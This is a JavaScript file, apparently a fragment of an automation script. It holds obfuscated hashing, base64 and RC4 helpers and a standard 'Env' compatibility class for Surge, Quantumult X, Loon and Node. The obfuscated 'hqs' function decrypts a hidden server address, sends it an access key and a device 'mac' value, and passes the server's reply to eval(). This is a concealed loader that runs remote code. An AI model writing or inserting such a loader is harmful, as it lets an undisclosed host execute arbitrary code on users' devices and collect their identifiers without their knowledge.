_0x29110f=_0x414e03,_0x3722a3=_0x5253d5,_0x557f91,_0x3a8a00=[],_0x12315e,_0x4133b8;for(_0x557f91=0x0;_0x557f91<_0x418a33[_0x3722a3(0x111,'5y0W')];_0x557f91++)if((_0x12315e=_0x418a33['charCodeAt'](_0x557f91))<0x80)_0x3a8a00[_0x29110f(0xf6)](_0x12315e);else{if(_0x12315e<0x800)_0x3a8a00[_0x3722a3(0xf8,'$6Z$')](0xc0+(_0x12315e>>0x6&0x1f),0x80+(_0x12315e&0x3f));else{if((_0x4133b8=_0x12315e^0xd800)>>0xa==0x0)_0x12315e=(_0x4133b8<<0xa)+(_0x418a33[_0x29110f(0x193)](++_0x557f91)^0xdc00)+0x10000,_0x3a8a00[_0x3722a3(0x175,'87fV')](0xf0+(_0x12315e>>0x12&0x7),0x80+(_0x12315e>>0xc&0x3f));else _0x3a8a00['push'](0xe0+(_0x12315e>>0xc&0xf));_0x3a8a00['push'](0x80+(_0x12315e>>0x6&0x3f),0x80+(_0x12315e&0x3f));}};return _0x3a8a00;}function sha(_0x234e9a){var _0x540603=_0x414e03,_0x5d74d9=_0x5253d5,_0x4b5aae=new Uint8Array(encodeUTF8(_0x234e9a)),_0x56ed7a,_0x219413,_0x2f8adf,_0x4825e6=(_0x4b5aae[_0x5d74d9(0xfd,'b!^F')]+0x8>>>0x6<<0x4)+0x10,_0x234e9a=new Uint8Array(_0x4825e6<<0x2);_0x234e9a[_0x5d74d9(0x1c9,'tNNs')](new Uint8Array(_0x4b5aae[_0x540603(0x1d2)])),_0x234e9a=new Uint32Array(_0x234e9a[_0x5d74d9(0x1bd,'b!^F')]);for(_0x2f8adf=new DataView(_0x234e9a[_0x540603(0x1d2)]),_0x56ed7a=0x0;_0x56ed7a<_0x4825e6;_0x56ed7a++)_0x234e9a[_0x56ed7a]=_0x2f8adf[_0x5d74d9(0x11c,'*Hkg')](_0x56ed7a<<0x2);_0x234e9a[_0x4b5aae[_0x540603(0x112)]>>0x2]|=0x80<<0x18-(_0x4b5aae[_0x540603(0x112)]&0x3)*0x8,_0x234e9a[_0x4825e6-0x1]=_0x4b5aae[_0x5d74d9(0x130,'Z7hG')]<<0x3;var _0x2ba769=[],_0x218ad0=[function(){return _0x43d562[0x1]&_0x43d562[0x2]|~_0x43d562[0x1]&_0x43d562[0x3];},function(){return _0x43d562[0x1]^_0x43d562[0x2]^_0x43d562[0x3];},function(){return _0x43d562[0x1]&_0x43d562[0x2]|_0x43d562[0x1]&_0x43d562[0x3]|_0x43d562[0x2]&_0x43d562[0x3];},function(){return _0x43d562[0x1]^_0x43d562[0x2]^_0x43d562[0x3];}],_0x31d7fb=function(_0x28911a,_0x1d37fd){return _0x28911a<<_0x1d37fd|_0x28911a>>>0x20-_0x1d37fd;},_0x4c6f59=[0x5a827999,0x6ed9eba1,-0x70e44324,-0x359d3e2a],_0x43d562=[0x67452301,-0x10325477,null,null,-0x3c2d1e10];_0x43d562[0x2]=~_0x43d562[0x0],_0x43d562[0x3]=~_0x43d562[0x1];for(_0x56ed7a=0x0;_0x56ed7a<_0x234e9a[_0x540603(0x112)];_0x56ed7a+=0x10){var _0x280265=_0x43d562[_0x5d74d9(0x18c,'&FG!')](0x0);for(_0x219413=0x0;_0x219413<0x50;_0x219413++)_0x2ba769[_0x219413]=_0x219413<0x10?_0x234e9a[_0x56ed7a+_0x219413]:_0x31d7fb(_0x2ba769[_0x219413-0x3]^_0x2ba769[_0x219413-0x8]^_0x2ba769[_0x219413-0xe]^_0x2ba769[_0x219413-0x10],0x1),_0x2f8adf=_0x31d7fb(_0x43d562[0x0],0x5)+_0x218ad0[_0x219413/0x14|0x0]()+_0x43d562[0x4]+_0x2ba769[_0x219413]+_0x4c6f59[_0x219413/0x14|0x0]|0x0,_0x43d562[0x1]=_0x31d7fb(_0x43d562[0x1],0x1e),_0x43d562['pop'](),_0x43d562[_0x5d74d9(0xf9,'X%Sb')](_0x2f8adf);for(_0x219413=0x0;_0x219413<0x5;_0x219413++)_0x43d562[_0x219413]=_0x43d562[_0x219413]+_0x280265[_0x219413]|0x0;};_0x2f8adf=new DataView(new Uint32Array(_0x43d562)[_0x5d74d9(0x13e,'w&tC')]);for(var _0x56ed7a=0x0;_0x56ed7a<0x5;_0x56ed7a++)_0x43d562[_0x56ed7a]=_0x2f8adf[_0x540603(0x1cf)](_0x56ed7a<<0x2);var _0x40c737=Array[_0x5d74d9(0x155,'&FG!')]['map'][_0x5d74d9(0x186,'$MZN')](new Uint8Array(new Uint32Array(_0x43d562)[_0x5d74d9(0x1b6,'X%Sb')]),function(_0x21f951){var _0x45c66d=_0x540603;return(_0x21f951<0x10?'0':'')+_0x21f951[_0x45c66d(0x136)](0x10);})[_0x5d74d9(0x109,'pDUA')]('');return _0x40c737;}function hqs(_0x1c4619=0xa){return new Promise(_0x1f41d1=>{var _0x311f89=_0x3915,_0x8044a9=_0x4567;let _0x5da41e=0xc,_0x56f3b4={'url':$['isNode']()?rc4($[_0x8044a9(0x17c)](),_0x311f89(0x12b,'0%ZD'))+('?key='+acckey+_0x311f89(0x16f,'PnFq')+_0x5da41e+_0x311f89(0xf1,'1CTd')+mac+_0x8044a9(0x188)):rc4($['fwur'](),_0x311f89(0x16a,'b!^F'))+(_0x8044a9(0x19b)+acckey+'&id='+_0x5da41e+_0x8044a9(0x105)+mac+_0x8044a9(0x188))};$[_0x8044a9(0x118)](_0x56f3b4,async(_0x3b7994,_0xee0571,_0x28259e)=>{var _0x314753=_0x8044a9,_0x4eb5b2=_0x311f89;try{let _0x2d94f1=eval(_0x28259e);_0x2d94f1[_0x4eb5b2(0x195,'SiH2')]==0xc8?(all_msg=_0x2d94f1[_0x314753(0x159)],_0x1f41d1(_0x2d94f1[_0x4eb5b2(0x101,'2kMS')])):(all_msg=_0x2d94f1['msg'],_0x1f41d1(![]));}catch(_0x3cb419){$[_0x4eb5b2(0xfa,'u[DE')](_0x3cb419,_0xee0571);}},0x0);});}function FxPCnMKLw7(){var _0x284df5=_0x5253d5,_0x1f83f9=_0x414e03;_keyStr=_0x1f83f9(0x14a),this[_0x284df5(0x127,'PwP%')]=function(_0x1d4018){var _0x20f2cd=_0x284df5,_0x1d1f76=_0x1f83f9,_0x5e450b='',_0x500b44,_0x168c32,_0x1b7298,_0x14ec4d,_0x78fb52,_0x8606d6,_0x37c2c2,_0xf1b02b=0x0;_0x1d4018=_utf8_encode(_0x1d4018);while(_0xf1b02b<_0x1d4018[_0x1d1f76(0x112)]){_0x500b44=_0x1d4018[_0x1d1f76(0x193)](_0xf1b02b++),_0x168c32=_0x1d4018[_0x1d1f76(0x193)](_0xf1b02b++),_0x1b7298=_0x1d4018[_0x20f2cd(0xff,'u[DE')](_0xf1b02b++),_0x14ec4d=_0x500b44>>0x2,_0x78fb52=(_0x500b44&0x3)<<0x4|_0x168c32>>0x4,_0x8606d6=(_0x168c32&0xf)<<0x2|_0x1b7298>>0x6,_0x37c2c2=_0x1b7298&0x3f;if(isNaN(_0x168c32))_0x8606d6=_0x37c2c2=0x40;else isNaN(_0x1b7298)&&(_0x37c2c2=0x40);_0x5e450b=_0x5e450b+_keyStr[_0x20f2cd(0x160,'u[DE')](_0x14ec4d)+_keyStr[_0x1d1f76(0x1cd)](_0x78fb52)+_keyStr[_0x1d1f76(0x1cd)](_0x8606d6)+_keyStr[_0x20f2cd(0x115,'ISx1')](_0x37c2c2);}return _0x5e450b;},this['decode']=function(_0x1221be){var _0x3649fd=_0x1f83f9,_0x128881=_0x284df5,_0x3f7198='',_0x46cd4e,_0x484311,_0x504869,_0x3dd0b7,_0x46d6dd,_0x441682,_0x35ad01,_0x40f81e=0x0;_0x1221be=_0x1221be[_0x128881(0x17d,'Q(nX')](/[^A-Za-z0-9\+\/\=]/g,'');while(_0x40f81e<_0x1221be[_0x3649fd(0x112)]){_0x3dd0b7=_keyStr[_0x128881(0x1cb,'tNNs')](_0x1221be[_0x3649fd(0x1cd)](_0x40f81e++)),_0x46d6dd=_keyStr[_0x128881(0x1b1,'H%jU')](_0x1221be['charAt'](_0x40f81e++)),_0x441682=_keyStr[_0x128881(0x169,'w&tC')](_0x1221be[_0x128881(0x1d1,'p9L0')](_0x40f81e++)),_0x35ad01=_keyStr[_0x3649fd(0x16b)](_0x1221be[_0x128881(0x15f,'87fV')](_0x40f81e++)),_0x46cd4e=_0x3dd0b7<<0x2|_0x46d6dd>>0x4,_0x484311=(_0x46d6dd&0xf)<<0x4|_0x441682>>0x2,_0x504869=(_0x441682&0x3)<<0x6|_0x35ad01,_0x3f7198=_0x3f7198+String[_0x3649fd(0x189)](_0x46cd4e),_0x441682!=0x40&&(_0x3f7198=_0x3f7198+String['fromCharCode'](_0x484311)),_0x35ad01!=0x40&&(_0x3f7198=_0x3f7198+String[_0x128881(0x12c,'$6Z$')](_0x504869));}return _0x3f7198=_utf8_decode(_0x3f7198),_0x3f7198;},_utf8_encode=function(_0x5220be){var _0xc0ad02=_0x284df5,_0x1c5b54=_0x1f83f9;_0x5220be=_0x5220be[_0x1c5b54(0x190)](/\r\n/g,'\x0a');var _0x587889='';for(var _0x1fc46d=0x0;_0x1fc46d<_0x5220be['length'];_0x1fc46d++){var _0x4e133f=_0x5220be['charCodeAt'](_0x1fc46d);if(_0x4e133f<0x80)_0x587889+=String['fromCharCode'](_0x4e133f);else _0x4e133f>0x7f&&_0x4e133f<0x800?(_0x587889+=String[_0xc0ad02(0x152,'SiH2')](_0x4e133f>>0x6|0xc0),_0x587889+=String[_0xc0ad02(0x152,'SiH2')](_0x4e133f&0x3f|0x80)):(_0x587889+=String[_0x1c5b54(0x189)](_0x4e133f>>0xc|0xe0),_0x587889+=String[_0xc0ad02(0x150,'nBKw')](_0x4e133f>>0x6&0x3f|0x80),_0x587889+=String[_0x1c5b54(0x189)](_0x4e133f&0x3f|0x80));}return _0x587889;},_utf8_decode=function(_0x5e6304){var _0xca4397=_0x1f83f9,_0x1b6d76=_0x284df5,_0x35ef29='',_0x5c75c4=0x0,_0x1f216d=c1=c2=0x0;while(_0x5c75c4<_0x5e6304[_0x1b6d76(0x180,'X%Sb')]){_0x1f216d=_0x5e6304[_0xca4397(0x193)](_0x5c75c4);if(_0x1f216d<0x80)_0x35ef29+=String[_0x1b6d76(0x1cc,'KlXj')](_0x1f216d),_0x5c75c4++;else _0x1f216d>0xbf&&_0x1f216d<0xe0?(c2=_0x5e6304[_0x1b6d76(0xec,'0uXp')](_0x5c75c4+0x1),_0x35ef29+=String[_0x1b6d76(0x1a2,'3yzT')]((_0x1f216d&0x1f)<<0x6|c2&0x3f),_0x5c75c4+=0x2):(c2=_0x5e6304[_0xca4397(0x193)](_0x5c75c4+0x1),c3=_0x5e6304[_0xca4397(0x193)](_0x5c75c4+0x2),_0x35ef29+=String['fromCharCode']((_0x1f216d&0xf)<<0xc|(c2&0x3f)<<0x6|c3&0x3f),_0x5c75c4+=0x3);}return _0x35ef29;};}function rc4(_0x5009aa,_0x536a2c){var _0x7d9b74=_0x5253d5,_0xff071e=_0x414e03,_0x1a549a=Array(0x100),_0x2848b6=Array(_0x5009aa[_0xff071e(0x112)]);for(var _0x489adf=0x0;_0x489adf<0x100;_0x489adf++){_0x1a549a[_0x489adf]=_0x489adf;var _0x6309c2=(_0x6309c2+_0x1a549a[_0x489adf]+_0x536a2c[_0x7d9b74(0x1b3,'jFik')](_0x489adf%_0x536a2c['length']))%0x100,_0x433419=_0x1a549a[_0x489adf];_0x1a549a[_0x489adf]=_0x1a549a[_0x6309c2],_0x1a549a[_0x6309c2]=_0x433419;}for(var _0x489adf=0x0;_0x489adf<_0x5009aa[_0x7d9b74(0x10d,'87fV')];_0x489adf++){_0x2848b6[_0x489adf]=_0x5009aa[_0xff071e(0x193)](_0x489adf);}for(var _0x4c87f4=0x0;_0x4c87f4<_0x2848b6[_0xff071e(0x112)];_0x4c87f4++){var _0x489adf=(_0x489adf+0x1)%0x100,_0x6309c2=(_0x6309c2+_0x1a549a[_0x489adf])%0x100,_0x433419=_0x1a549a[_0x489adf];_0x1a549a[_0x489adf]=_0x1a549a[_0x6309c2],_0x1a549a[_0x6309c2]=_0x433419;var _0x2c0a02=(_0x1a549a[_0x489adf]+_0x1a549a[_0x6309c2]%0x100)%0x100;_0x2848b6[_0x4c87f4]=String[_0xff071e(0x189)](_0x2848b6[_0x4c87f4]^_0x1a549a[_0x2c0a02]);}return _0x2848b6['join']('');}
function Env(t, e) {
    class s {
        constructor(t) {
            this.env = t
        }
        send(t, e = "GET") {
            t = "string" == typeof t ? {
                url: t
            } : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }
        get(t) {
            return this.send.call(this.env, t)
        }
        post(t) {
            return this.send.call(this.env, t, "POST")
        }
    }
    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.encoding = "utf-8", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`)
        }
        isNode() {
            return "undefined" != typeof module && !!module.exports
        }
        isQuanX() {
            return "undefined" != typeof $task
        }
        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }
        isLoon() {
            return "undefined" != typeof $loon
        }
        isShadowrocket() {
            return "undefined" != typeof $rocket
        }
        toObj(t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }
        toStr(t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }
        getjson(t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch { }
            return s
        }
        setjson(t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }
        getScript(t) {
            return new Promise(e => {
                this.get({
                    url: t
                }, (t, s, i) => e(i))
            })
        }
        runScript(t, e) {
            return new Promise(s => {
                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {
                        script_text: t,
                        mock_type: "cron",
                        timeout: r
                    },
                    headers: {
                        "X-Key": o,
                        Accept: "*/*"
                    }
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }
        loaddata() {
            if (!this.isNode()) return {}; {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e);
                if (!s && !i) return {}; {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }
        writedata() {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e),
                    r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }
        lodash_get(t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i)
                if (r = Object(r)[t], void 0 === r) return s;
            return r
        }
        lodash_set(t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }
        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }
        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }
        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }
        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }
        initGotEnv(t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }
        get(t, e = (() => { })) {
            if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let s = require("iconv-lite");
                this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                    try {
                        if (t.headers["set-cookie"]) {
                            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                            s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                        }
                    } catch (t) {
                        this.logErr(t)
                    }
                }).then(t => {
                    const {
                        statusCode: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, s.decode(h, this.encoding))
                }, t => {
                    const {
                        message: i,
                        response: r
                    } = t;
                    e(i, r, r && s.decode(r.rawBody, this.encoding))
                })
            }
        }
        post(t, e = (() => { })) {
            const s = t.method ? t.method.toLocaleLowerCase() : "post";
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient[s](t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) t.method = s, this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let i = require("iconv-lite");
                this.initGotEnv(t);
                const {
                    url: r,
                    ...o
                } = t;
                this.got[s](r, o).then(t => {
                    const {
                        statusCode: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, i.decode(h, this.encoding))
                }, t => {
                    const {
                        message: s,
                        response: r
                    } = t;
                    e(s, r, r && i.decode(r.rawBody, this.encoding))
                })
            }
        }
        time(t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }
        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {
                    "open-url": t
                } : this.isSurge() ? {
                    url: t
                } : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"],
                            s = t.mediaUrl || t["media-url"];
                        return {
                            openUrl: e,
                            mediaUrl: s
                        }
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl,
                            s = t["media-url"] || t.mediaUrl;
                        return {
                            "open-url": e,
                            "media-url": s
                        }
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {
                            url: e
                        }
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============📣系统通知📣=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }
        fwcaas() {
            return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
        }
        log(...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }
        logErr(t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
        }
        fwur() {
            var bbas = new FxPCnMKLw7()
            return bbas.decode(this.fwcaas());
        }
        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }
        done(t = {}) {
            const e = (new Date).getTime(),
                s = (e - this.startTime) / 1e3;
            this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}
